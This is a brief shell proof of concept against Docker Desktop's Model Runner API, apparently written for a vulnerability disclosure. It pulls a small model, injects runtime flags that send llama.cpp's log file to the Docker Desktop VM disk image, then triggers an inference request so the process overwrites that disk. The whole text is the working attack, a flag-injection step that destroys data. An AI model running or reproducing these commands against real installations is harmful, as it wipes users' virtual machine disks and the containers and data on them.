# Pull Smollm2 LLM OCI artifact from Docker Hub
curl -X POST http://model-runner.docker.internal/models/create -d '{"from":"ai/smollm2:latest"}'

# Point the `--log-file` argument to Docker Desktop data disk
# `-n 1` caps inference output to a single token
curl -X POST http://model-runner.docker.internal/engines/_configure  -d '{
        "model":"ai/smollm2:latest",
        "raw-runtime-flags":"--log-file ./vms/0/data/Docker.raw -n 1"
}'

# Invoke chat completion to run inference server process to overwrite Docker Desktop VM disk
curl http://model-runner.docker.internal/engines/llama.cpp/v1/chat/completions -d '{
    "model": "ai/smollm2:latest",
    "messages": [
        {"role":"system","content":"You are a helpful assistant."},
        {"role": "user","content": "hey there!"}
    ]
}'
